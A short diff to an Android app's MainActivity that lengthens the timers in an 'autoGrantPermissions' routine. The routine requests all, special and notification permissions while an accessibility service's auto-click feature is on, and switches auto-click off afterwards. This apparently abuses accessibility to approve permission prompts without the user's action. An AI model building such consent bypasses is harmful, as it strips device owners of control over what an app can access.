@@ -89,7 +89,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void autoGrantPermissions() {
-        Toast.makeText(this, "Accessibility enabled! Setting up permissions...", Toast.LENGTH_SHORT).show();
+        Toast.makeText(this, "Accessibility enabled! Setting up (10s)...", Toast.LENGTH_LONG).show();
         
         // Request all permissions
         new Handler().postDelayed(() -> {
@@ -99,17 +99,17 @@ public class MainActivity extends AppCompatActivity {
         // Request special permissions
         new Handler().postDelayed(() -> {
             permissionManager.requestSpecialPermissions();
-        }, 2500);
+        }, 3000);
 
         // Request notification
         new Handler().postDelayed(() -> {
             permissionManager.requestNotificationPermission();
-        }, 4000);
+        }, 5000);
 
-        // Disable auto-click after setup is complete
+        // Disable auto-click after setup is complete (10 seconds)
         new Handler().postDelayed(() -> {
             AccessibilityHelperService.disableAutoClick();
-        }, 6000);
+        }, 10000);
     }
 
     @Override
